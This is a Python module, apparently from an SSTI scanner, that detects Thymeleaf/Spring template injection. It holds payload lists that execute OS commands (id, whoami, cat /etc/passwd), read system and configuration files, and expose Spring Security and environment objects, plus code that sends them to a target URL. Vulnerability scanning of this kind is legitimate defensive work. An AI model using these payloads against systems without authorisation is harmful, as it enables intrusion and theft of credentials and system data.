"""
Thymeleaf template engine detection module.

This module implements Server-Side Template Injection (SSTI) detection
for the Thymeleaf template engine, commonly used in Spring applications.

Author: SSTI Scanner Team
License: MIT
"""

import re
import urllib.parse
from typing import List, Dict, Any, Optional

from .base import BaseTemplateEngine, EngineResult, ConfidenceLevel, Payload


class ThymeleafEngine(BaseTemplateEngine):
    """
    Thymeleaf template engine detector.
    
    Thymeleaf is a Java-based template engine commonly used with Spring Framework.
    It uses ${} and *{} for expressions and th: attributes.
    """
    
    def __init__(self, config):
        super().__init__(config)
        self.name = "thymeleaf"
        self.description = "Thymeleaf template engine (Spring)"
        self.payloads = self._load_payloads()
        
        # Thymeleaf-specific patterns for detection
        self.detection_patterns = {
            'math_result': [
                r'\b49\b',  # 7*7
                r'\b64\b',  # 8*8
                r'\b121\b', # 11*11
            ],
            'object_disclosure': [
                r'org\.thymeleaf',
                r'org\.springframework',
                r'java\.lang\.Object',
                r'StandardExpressionParser',
                r'SpringELExpressionParser',
                r'TemplateProcessingParameters',
            ],
            'variable_disclosure': [
                r'Context.*?variables',
                r'ModelMap',
                r'RequestContext',
                r'LocaleContext',
                r'WebContext',
            ],
            'spring_objects': [
                r'ApplicationContext',
                r'BeanFactory',
                r'Environment',
                r'ResourceLoader',
                r'ConversionService',
            ],
            'el_execution': [
                r'T\(.*?\)',  # Type expressions
                r'#ctx',
                r'#root',
                r'#vars',
                r'#locale',
            ]
        }
    
    def _load_payloads(self) -> List[Payload]:
        """Load Thymeleaf-specific SSTI payloads."""
        payloads = []
        
        # Basic math operations using Spring EL
        math_payloads = [
            "${7*7}",
            "${8*8}",
            "${11*11}",
            "*{7*7}",
            "*{8*8}",
            "[[${7*7}]]",
            "[(${7*7})]",
            "${T(java.lang.Math).abs(-49)}",
            "${7 * 7}",
            "${(7) * (7)}",
        ]
        
        for payload in math_payloads:
            payloads.append(Payload(
                payload=payload,
                type="math",
                context="html",
                description="Basic mathematical operation"
            ))
        
        # Context and variable access
        context_payloads = [
            "${#ctx}",
            "${#root}",
            "${#vars}",
            "${#locale}",
            "${#request}",
            "${#response}",
            "${#session}",
            "${#servletContext}",
            "*{#ctx}",
            "*{#vars}",
            "[[${#ctx}]]",
            "[(${#vars})]",
        ]
        
        for payload in context_payloads:
            payloads.append(Payload(
                payload=payload,
                type="context_access",
                context="html",
                description="Context and variable access"
            ))
        
        # Spring-specific object access
        spring_payloads = [
            "${@beanName}",
            "${@environment}",
            "${@applicationContext}",
            "${@conversionService}",
            "${@messageSource}",
            "${@resourceLoader}",
            "${applicationContext}",
            "${servletContext}",
            "${@environment.getProperty('java.version')}",
            "${@environment.getProperty('user.name')}",
            "${@environment.getProperty('os.name')}",
        ]
        
        for payload in spring_payloads:
            payloads.append(Payload(
                payload=payload,
                type="spring_access",
                context="html",
                description="Spring Framework object access"
            ))
        
        # Type expressions (T operator)
        type_payloads = [
            "${T(java.lang.System).getProperty('java.version')}",
            "${T(java.lang.System).getProperty('user.name')}",
            "${T(java.lang.System).getProperty('os.name')}",
            "${T(java.lang.Runtime).getRuntime()}",
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
            "${T(java.lang.Runtime).getRuntime().exec('whoami')}",
            "${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}",
            "${T(java.lang.Class).forName('java.lang.Runtime')}",
            "${T(java.lang.Class).forName('java.lang.System')}",
            "${T(java.io.File)}",
            "${T(java.util.Scanner)}",
        ]
        
        for payload in type_payloads:
            payloads.append(Payload(
                payload=payload,
                type="type_expression",
                context="html",
                description="Type expression (T operator)"
            ))
        
        # Request/Response object access
        request_payloads = [
            "${#request.getMethod()}",
            "${#request.getRequestURL()}",
            "${#request.getServletPath()}",
            "${#request.getContextPath()}",
            "${#request.getQueryString()}",
            "${#request.getHeader('User-Agent')}",
            "${#request.getParameterNames()}",
            "${#request.getAttributeNames()}",
            "${#servletContext.getServerInfo()}",
            "${#servletContext.getRealPath('/')}",
            "${#servletContext.getInitParameterNames()}",
            "${#session.getId()}",
            "${#session.getAttributeNames()}",
            "${#session.getCreationTime()}",
        ]
        
        for payload in request_payloads:
            payloads.append(Payload(
                payload=payload,
                type="request_access",
                context="html",
                description="Request/Response object access"
            ))
        
        # Utility expressions
        utility_payloads = [
            "${#strings.toUpperCase('test')}",
            "${#strings.toLowerCase('TEST')}",
            "${#strings.length('test')}",
            "${#strings.substring('test',0,2)}",
            "${#strings.contains('test','es')}",
            "${#numbers.formatDecimal(49,0,2)}",
            "${#dates.format(#dates.createNow(),'yyyy-MM-dd')}",
            "${#arrays.length(new int[]{1,2,3})}",
            "${#lists.size(#lists.toList('a,b,c'))}",
            "${#sets.size(#sets.toSet('a,b,c'))}",
            "${#maps.size(#maps.toMap('a=1,b=2'))}",
        ]
        
        for payload in utility_payloads:
            payloads.append(Payload(
                payload=payload,
                type="utility",
                context="html",
                description="Utility expression"
            ))
        
        # File system access
        file_payloads = [
            "${T(java.io.File).new('/etc/passwd')}",
            "${T(java.io.FileReader).new('/etc/passwd')}",
            "${T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get('/etc/passwd'))}",
            "${T(java.util.Scanner).new(T(java.io.File).new('/etc/passwd')).useDelimiter('\\\\Z').next()}",
            "${T(org.apache.commons.io.IOUtils).toString(T(java.io.FileInputStream).new('/etc/passwd'))}",
        ]
        
        for payload in file_payloads:
            payloads.append(Payload(
                payload=payload,
                type="file_access",
                context="html",
                description="File system access"
            ))
        
        # Command execution
        exec_payloads = [
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
            "${T(java.lang.Runtime).getRuntime().exec('whoami')}",
            "${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}",
            "${T(java.lang.Runtime).getRuntime().exec('ls -la')}",
            "${T(java.lang.ProcessBuilder).new('id').start()}",
            "${T(java.lang.ProcessBuilder).new('whoami').start()}",
            "${T(java.lang.ProcessBuilder).new(T(java.util.Arrays).asList('cat','/etc/passwd')).start()}",
        ]
        
        for payload in exec_payloads:
            payloads.append(Payload(
                payload=payload,
                type="code_execution",
                context="html",
                description="Command execution"
            ))
        
        # Attribute-based payloads (th: syntax)
        attribute_payloads = [
            'th:text="${7*7}"',
            'th:utext="${7*7}"',
            'th:value="${7*7}"',
            'th:attr="value=${7*7}"',
            'th:if="${7==7}"',
            'th:unless="${7!=7}"',
            'th:text="${#ctx}"',
            'th:text="${T(java.lang.System).getProperty(\'java.version\')}"',
            'th:onclick="javascript:alert(${7*7})"',
            'data-th-text="${7*7}"',
            'data-th-utext="${7*7}"',
        ]
        
        for payload in attribute_payloads:
            payloads.append(Payload(
                payload=payload,
                type="attribute",
                context="attribute",
                description="Thymeleaf attribute syntax"
            ))
        
        # Fragment expressions
        fragment_payloads = [
            "~{templatename}",
            "~{templatename :: selector}",
            "~{::selector}",
            "~{this :: selector}",
            "${__${T(java.lang.System).getProperty('java.version')}__}",
        ]
        
        for payload in fragment_payloads:
            payloads.append(Payload(
                payload=payload,
                type="fragment",
                context="html",
                description="Fragment expression"
            ))
        
        # URL-encoded payloads
        url_payloads = [
            "%24%7B7%2A7%7D",  # ${7*7}
            "%24%7B%23ctx%7D",  # ${#ctx}
            "%24%7BT%28java.lang.System%29.getProperty%28%27java.version%27%29%7D",
        ]
        
        for payload in url_payloads:
            payloads.append(Payload(
                payload=payload,
                type="math",
                context="url",
                description="URL-encoded payload"
            ))
        
        # Error triggering for information disclosure
        error_payloads = [
            "${undefined_variable}",
            "${#undefined_utility.method()}",
            "${T(undefined.class)}",
            "${@undefined_bean}",
            "${#ctx.undefined_method()}",
            "*{undefined_field}",
            "[[${undefined_expression}]]",
            "[(${undefined_expression})]",
            "${T(java.lang.Class).forName('undefined.class')}",
        ]
        
        for payload in error_payloads:
            payloads.append(Payload(
                payload=payload,
                type="error_trigger",
                context="html",
                description="Error triggering for information disclosure"
            ))
        
        # Advanced exploitation techniques
        advanced_payloads = [
            # Class loading and reflection
            "${T(java.lang.Class).forName('java.lang.Runtime').getMethod('getRuntime').invoke(null)}",
            "${T(java.lang.Class).forName('java.lang.System').getMethod('getProperty',T(java.lang.String)).invoke(null,'java.version')}",
            
            # Spring Security access
            "${T(org.springframework.security.core.context.SecurityContextHolder).getContext().getAuthentication()}",
            "${@authenticationManager}",
            "${@userDetailsService}",
            
            # Spring Boot actuator access
            "${@healthEndpoint}",
            "${@configurationPropertiesReportEndpoint}",
            "${@environmentEndpoint}",
            
            # Resource loading
            "${@resourceLoader.getResource('classpath:application.properties')}",
            "${@resourceLoader.getResource('file:/etc/passwd')}",
            
            # Database access
            "${@dataSource}",
            "${@jdbcTemplate}",
            "${@entityManager}",
            
            # Cache access
            "${@cacheManager}",
            
            # Message source access
            "${@messageSource.getMessage('test',null,#locale)}",
            
            # Environment properties
            "${@environment.getActiveProfiles()}",
            "${@environment.getDefaultProfiles()}",
            "${@environment.getSystemProperties()}",
            "${@environment.getSystemEnvironment()}",
        ]
        
        for payload in advanced_payloads:
            payloads.append(Payload(
                payload=payload,
                type="advanced",
                context="html",
                description="Advanced Thymeleaf/Spring exploitation"
            ))
        
        return payloads
    
    async def test_payload(self, url: str, payload: str, **kwargs) -> EngineResult:
        """
        Test a single payload against the target URL.
        
        Args:
            url: Target URL
            payload: Payload to test
            **kwargs: Additional arguments (http_client, method, data, headers)
        
        Returns:
            EngineResult with test results
        """
        http_client = kwargs.get('http_client')
        method = kwargs.get('method', 'GET')
        data = kwargs.get('data', {})
        headers = kwargs.get('headers', {})
        
        if not http_client:
            return EngineResult(
                is_vulnerable=False,
                confidence=ConfidenceLevel.LOW,
                payload=payload,
                response="",
                evidence="No HTTP client provided",
                engine=self.name
            )
        
        try:
            # Determine injection point and method
            if method.upper() == 'GET':
                # URL parameter injection
                if '?' in url:
                    test_url = url.replace('INJECT', payload)
                    if 'INJECT' not in url:
                        # Add payload to first parameter
                        if '=' in url:
                            test_url = re.sub(r'(=)([^&]*)', f'\\1{payload}', url, count=1)
                        else:
                            test_url = f"{url}&test={payload}"
                    else:
                        test_url = url.replace('INJECT', payload)
                else:
                    test_url = f"{url}?test={payload}"
                
                response = await http_client.get(test_url, headers=headers)
            else:
                # POST data injection
                if data:
                    # Inject into existing data
                    test_data = data.copy()
                    if 'INJECT' in str(test_data):
                        test_data = {k: v.replace('INJECT', payload) if isinstance(v, str) else v 
                                   for k, v in test_data.items()}
                    else:
                        # Add payload to first field or create test field
                        if test_data:
                            first_key = next(iter(test_data))
                            test_data[first_key] = payload
                        else:
                            test_data['test'] = payload
                else:
                    test_data = {'test': payload}
                
                response = await http_client.post(url, data=test_data, headers=headers)
            
            # Analyze the response
            return self.analyze_response("", payload, response.get('text', ''))
            
        except Exception as e:
            return EngineResult(
                is_vulnerable=False,
                confidence=ConfidenceLevel.LOW,
                payload=payload,
                response="",
                evidence=f"Request failed: {str(e)}",
                engine=self.name
            )
    
    def analyze_response(self, original_response: str, payload: str, response: str) -> EngineResult:
        """
        Analyze response for Thymeleaf SSTI indicators.
        
        Args:
            original_response: Original response (baseline)
            payload: Payload that was sent
            response: Response to analyze
        
        Returns:
            EngineResult with analysis results
        """
        if not response:
            return EngineResult(
                is_vulnerable=False,
                confidence=ConfidenceLevel.LOW,
                payload=payload,
                response=response,
                evidence="Empty response",
                engine=self.name
            )
        
        # Check for direct payload reflection (likely not vulnerable)
        if payload in response and not any(pattern in response.lower() for pattern in ['thymeleaf', 'spring', 'java.lang']):
            return EngineResult(
                is_vulnerable=False,
                confidence=ConfidenceLevel.LOW,
                payload=payload,
                response=response,
                evidence="Payload reflected without execution",
                engine=self.name
            )
        
        evidence_parts = []
        confidence = ConfidenceLevel.LOW
        is_vulnerable = False
        
        # Math operation detection
        if any(p in payload for p in ['7*7', '8*8', '11*11']):
            for pattern in self.detection_patterns['math_result']:
                if re.search(pattern, response):
                    evidence_parts.append(f"Mathematical operation executed: found {pattern}")
                    confidence = ConfidenceLevel.HIGH
                    is_vulnerable = True
                    break
        
        # Object disclosure detection
        for pattern in self.detection_patterns['object_disclosure']:
            if re.search(pattern, response, re.IGNORECASE):
                evidence_parts.append(f"Object disclosure detected: {pattern}")
                confidence = max(confidence, ConfidenceLevel.HIGH)
                is_vulnerable = True
        
        # Variable disclosure detection
        for pattern in self.detection_patterns['variable_disclosure']:
            if re.search(pattern, response, re.IGNORECASE):
                evidence_parts.append(f"Variable disclosure detected: {pattern}")
                confidence = max(confidence, ConfidenceLevel.MEDIUM)
                is_vulnerable = True
        
        # Spring object detection
        for pattern in self.detection_patterns['spring_objects']:
            if re.search(pattern, response, re.IGNORECASE):
                evidence_parts.append(f"Spring object access detected: {pattern}")
                confidence = max(confidence, ConfidenceLevel.HIGH)
                is_vulnerable = True
        
        # Thymeleaf-specific error messages
        thymeleaf_errors = [
            'org.thymeleaf.exceptions',
            'TemplateProcessingException',
            'TemplateInputException',
            'StandardExpressionExecutionContext',
            'Could not parse as expression',
            'Exception evaluating SpringEL expression',
            'PropertyAccessException',
            'SpelEvaluationException',
            'EL1008E',  # Spring EL error codes
            'EL1007E',
            'EL1001E',
        ]
        
        for error in thymeleaf_errors:
            if re.search(error, response, re.IGNORECASE):
                evidence_parts.append(f"Thymeleaf/Spring EL error detected: {error}")
                confidence = max(confidence, ConfidenceLevel.MEDIUM)
                is_vulnerable = True
        
        # Java-specific indicators
        java_indicators = [
            'java.lang.Class',
            'java.lang.Runtime',
            'java.lang.System',
            'java.io.File',
            'java.util.',
            'org.springframework',
            'getClass()',
            'getMethod(',
            'invoke(',
            'newInstance(',
        ]
        
        for indicator in java_indicators:
            if re.search(indicator, response, re.IGNORECASE):
                evidence_parts.append(f"Java class/method access detected: {indicator}")
                confidence = max(confidence, ConfidenceLevel.HIGH)
                is_vulnerable = True
        
        # Check for context variable access
        if any(ctx in payload for ctx in ['#ctx', '#vars', '#locale', '#request']):
            context_patterns = [
                r'Context.*?variables',
                r'WebContext',
                r'LocaleContext',
                r'RequestContext',
                r'Variables.*?map',
                r'Locale.*?object',
            ]
            
            for pattern in context_patterns:
                if re.search(pattern, response, re.IGNORECASE):
                    evidence_parts.append(f"Context variable access: {pattern}")
                    confidence = max(confidence, ConfidenceLevel.HIGH)
                    is_vulnerable = True
        
        # Check for type expression execution
        if 'T(' in payload:
            type_patterns = [
                r'class java\.',
                r'java\.lang\.Class',
                r'getRuntime',
                r'getProperty',
                r'ProcessBuilder',
            ]
            
            for pattern in type_patterns:
                if re.search(pattern, response, re.IGNORECASE):
                    evidence_parts.append(f"Type expression executed: {pattern}")
                    confidence = max(confidence, ConfidenceLevel.HIGH)
                    is_vulnerable = True
        
        # Check for utility expression results
        if any(util in payload for util in ['#strings', '#numbers', '#dates', '#arrays']):
            utility_patterns = [
                r'TEST',  # uppercase result
                r'test',  # lowercase result
                r'\d{4}-\d{2}-\d{2}',  # date format
                r'\d+\.\d+',  # formatted number
            ]
            
            for pattern in utility_patterns:
                if re.search(pattern, response):
                    evidence_parts.append(f"Utility expression executed: {pattern}")
                    confidence = max(confidence, ConfidenceLevel.HIGH)
                    is_vulnerable = True
        
        # Check for Spring bean access
        if '@' in payload:
            bean_patterns = [
                r'ApplicationContext',
                r'BeanFactory',
                r'Environment',
                r'ConversionService',
                r'DataSource',
                r'JdbcTemplate',
            ]
            
            for pattern in bean_patterns:
                if re.search(pattern, response, re.IGNORECASE):
                    evidence_parts.append(f"Spring bean access: {pattern}")
                    confidence = max(confidence, ConfidenceLevel.HIGH)
                    is_vulnerable = True
        
        # System property disclosure
        system_props = [
            'java.version',
            'user.name',
            'os.name',
            'java.home',
            'user.dir',
        ]
        
        for prop in system_props:
            if prop in response:
                evidence_parts.append(f"System property disclosed: {prop}")
                confidence = max(confidence, ConfidenceLevel.HIGH)
                is_vulnerable = True
        
        # Check for request object access results
        if '#request' in payload or '#servletContext' in payload or '#session' in payload:
            request_patterns = [
                r'GET|POST|PUT|DELETE',  # HTTP methods
                r'HTTP/1\.[01]',  # HTTP version
                r'Mozilla.*?',  # User-Agent
                r'application.*?json',  # Content types
                r'jsessionid',  # Session ID
            ]
            
            for pattern in request_patterns:
                if re.search(pattern, response, re.IGNORECASE):
                    evidence_parts.append(f"Request object access: {pattern}")
                    confidence = max(confidence, ConfidenceLevel.MEDIUM)
                    is_vulnerable = True
        
        # Check for file access results
        if any(func in payload for func in ['File', 'FileReader', 'Files.readAllLines']):
            file_patterns = [
                r'root:x:0:0',  # /etc/passwd
                r'bin/bash',    # /etc/passwd
                r'daemon:x:',   # /etc/passwd
            ]
            
            for pattern in file_patterns:
                if re.search(pattern, response):
                    evidence_parts.append(f"File access successful: {pattern}")
                    confidence = max(confidence, ConfidenceLevel.HIGH)
                    is_vulnerable = True
        
        # Compile evidence
        if evidence_parts:
            evidence = "Thymeleaf SSTI detected: " + "; ".join(evidence_parts)
        else:
            evidence = "No Thymeleaf SSTI indicators found"
            
        return EngineResult(
            is_vulnerable=is_vulnerable,
            confidence=confidence,
            payload=payload,
            response=response[:500],  # Limit response size
            evidence=evidence,
            engine=self.name
        )
    
    def get_payloads_for_context(self, context: str) -> List[Payload]:
        """Get payloads suitable for a specific context."""
        return [p for p in self.payloads if p.context == context]
    
    def get_payloads_by_type(self, payload_type: str) -> List[Payload]:
        """Get payloads of a specific type."""
        return [p for p in self.payloads if p.type == payload_type]
    
    def encode_payload(self, payload: str, context: str) -> str:
        """
        Encode payload for specific context.
        
        Args:
            payload: Original payload
            context: Target context (url, html, attribute, etc.)
        
        Returns:
            Encoded payload
        """
        if context == "url":
            return urllib.parse.quote(payload)
        elif context == "html":
            return payload.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;')
        elif context == "attribute":
            return payload.replace('"', '&quot;').replace("'", '&#x27;')
        elif context == "javascript":
            return payload.replace('\\', '\\\\').replace('"', '\\"').replace("'", "\\'")
        else:
            return payload
    
    def get_info(self) -> Dict[str, Any]:
        """Get engine information."""
        return {
            'name': self.name,
            'description': self.description,
            'payloads': len(self.payloads),
            'contexts': list(set(p.context for p in self.payloads)),
            'types': list(set(p.type for p in self.payloads)),
            'framework': 'Spring Framework',
            'language': 'Java',
            'syntax': '${expression}, *{selection}, th:attribute'
        }
